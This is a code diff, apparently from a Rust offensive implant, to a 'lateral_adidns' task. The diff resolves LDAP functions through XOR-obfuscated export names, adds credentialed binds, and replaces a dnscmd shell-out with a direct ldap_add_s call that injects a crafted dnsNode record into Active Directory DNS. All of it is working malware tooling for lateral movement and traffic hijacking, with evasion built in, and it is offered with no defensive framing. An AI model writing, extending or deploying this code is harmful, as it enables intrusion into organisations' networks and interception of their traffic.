@@ -377,6 +377,9 @@ fn lateral_adidns(v: &serde_json::Value) -> TaskOutput {
         .unwrap_or(&domain_fqdn).to_string();
 
     let action = v.get("action").and_then(|s| s.as_str()).unwrap_or("list");
+    let bind_user = v.get("user").and_then(|s| s.as_str())
+        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
+    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());
 
     // DNS zone base in AD
     let zone_dn = format!("DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{}",
@@ -403,6 +406,7 @@ fn lateral_adidns(v: &serde_json::Value) -> TaskOutput {
     type LdapMsgFreeFn= unsafe extern "system" fn(*mut u8) -> u32;
     type LdapUnbindFn = unsafe extern "system" fn(*mut u8) -> u32;
     type LdapDelFn    = unsafe extern "system" fn(*mut u8, *const u8) -> u32;
+    type LdapAddFn    = unsafe extern "system" fn(*mut u8, *const u8, *const *const u8) -> u32;
 
     macro_rules! wl { ($enc:expr, $ty:ty) => {{
         match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
@@ -425,13 +429,22 @@ fn lateral_adidns(v: &serde_json::Value) -> TaskOutput {
     let fn_msgfree = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
     let fn_unbind  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapUnbindFn);
     let fn_delete  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3E,0x3F,0x36,0x3F,0x2E,0x3F,0x05,0x29,0x5A], LdapDelFn);
+    // ldap_add_s XOR 0x5A: [0x36,0x3E,0x3B,0x2A,0x05,0x3B,0x3E,0x3E,0x05,0x29,0x5A]
+    let fn_add     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3B,0x3E,0x3E,0x05,0x29,0x5A], LdapAddFn);
 
     let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
     let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
     if ld.is_null() { return TaskOutput::failure("adidns: ldap_init failed"); }
     let ver: u32 = 3;
     unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
-    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
+    let user_b: Vec<u8> = match bind_user.as_deref() { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let pass_b: Vec<u8> = match bind_pass.as_deref() { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if bind_user.is_some() {
+        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
+    } else {
+        (core::ptr::null(), core::ptr::null(), 0x0486)
+    };
+    let br = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
     if br != 0 { unsafe { fn_unbind(ld) }; return TaskOutput::failure(&format!("adidns: ldap_bind: {br:#x}")); }
 
     let cleanup = |ld: *mut u8| { unsafe { fn_unbind(ld) }; };
@@ -520,30 +533,46 @@ fn lateral_adidns(v: &serde_json::Value) -> TaskOutput {
             dns_rec.extend_from_slice(&0u32.to_le_bytes());  // TimeStamp (0 = static)
             dns_rec.extend_from_slice(&ip_bytes);            // IPv4 address
 
-            let _ = dns_rec; // built but add goes via dnscmd (more reliable than raw LDAP mod)
-            cleanup(ld);
-            let result = std::process::Command::new("cmd.exe")
-                .args(["/c", &format!(
-                    "dnscmd /RecordAdd {zone} {name} A {ip_str} /openacl 2>&1 || \
-                     dnscmd {dc} /RecordAdd {zone} {name} A {ip_str} 2>&1"
-                )])
-                .output();
-            match result {
-                Ok(o) => {
-                    let out = String::from_utf8_lossy(&o.stdout).to_string()
-                        + &String::from_utf8_lossy(&o.stderr);
-                    if o.status.success() || out.contains("created successfully") || out.contains("Command completed") {
-                        TaskOutput::success(serde_json::to_vec(&serde_json::json!({
-                            "status": "DNS record added",
-                            "name": name, "ip": ip_str, "zone": zone, "ttl": ttl,
-                            "dnscmd_output": out.trim(),
-                        })).unwrap_or_default())
-                    } else {
-                        TaskOutput::failure(&format!("adidns: add failed: {out}"))
-                    }
-                }
-                Err(e) => TaskOutput::failure(&format!("adidns: exec: {e}")),
+            // Add dnsNode object via LDAP directly
+            let node_dn: Vec<u8> = format!("DC={name},{zone_dn}")
+                .bytes().chain(core::iter::once(0u8)).collect();
+
+            // Attribute: objectClass = "dnsNode" (string, LDAP_MOD_ADD=0)
+            let oc_attr:  Vec<u8> = b"objectClass\0".to_vec();
+            let oc_val:   Vec<u8> = b"dnsNode\0".to_vec();
+            let oc_vals: [*const u8; 2] = [oc_val.as_ptr(), core::ptr::null()];
+            let mut oc_mod = [0u8; 24]; // mod_op(u32)+pad(4)+mod_type(8)+mod_vals(8)
+            unsafe {
+                *(oc_mod.as_mut_ptr() as *mut u32) = 0; // LDAP_MOD_ADD
+                *((oc_mod.as_mut_ptr().add(8)) as *mut *const u8) = oc_attr.as_ptr();
+                *((oc_mod.as_mut_ptr().add(16)) as *mut *const *const u8) = oc_vals.as_ptr();
             }
+
+            // Attribute: dnsRecord = dns_rec bytes (binary, LDAP_MOD_ADD|LDAP_MOD_BVALUES=0x80)
+            let rec_attr: Vec<u8> = b"dnsRecord\0".to_vec();
+            let mut berval = [0u8; 16]; // BERVAL: bv_len(u32)+pad(4)+bv_val(*u8)
+            unsafe {
+                *(berval.as_mut_ptr() as *mut u32) = dns_rec.len() as u32;
+                *((berval.as_mut_ptr().add(8)) as *mut *const u8) = dns_rec.as_ptr();
+            }
+            let rec_vals: [*const u8; 2] = [berval.as_ptr(), core::ptr::null()];
+            let mut rec_mod = [0u8; 24];
+            unsafe {
+                *(rec_mod.as_mut_ptr() as *mut u32) = 0x80u32; // LDAP_MOD_BVALUES
+                *((rec_mod.as_mut_ptr().add(8)) as *mut *const u8) = rec_attr.as_ptr();
+                *((rec_mod.as_mut_ptr().add(16)) as *mut *const *const u8) = rec_vals.as_ptr();
+            }
+
+            let mods: [*const u8; 3] = [oc_mod.as_ptr(), rec_mod.as_ptr(), core::ptr::null()];
+            let ar = unsafe { fn_add(ld, node_dn.as_ptr(), mods.as_ptr()) };
+            cleanup(ld);
+            if ar != 0 {
+                return TaskOutput::failure(&format!("adidns: ldap_add_s: {ar:#x}"));
+            }
+            TaskOutput::success(serde_json::to_vec(&serde_json::json!({
+                "status": "DNS record added",
+                "name": name, "ip": ip_str, "zone": zone, "ttl": ttl,
+            })).unwrap_or_default())
         }
         other => {
             cleanup(ld);
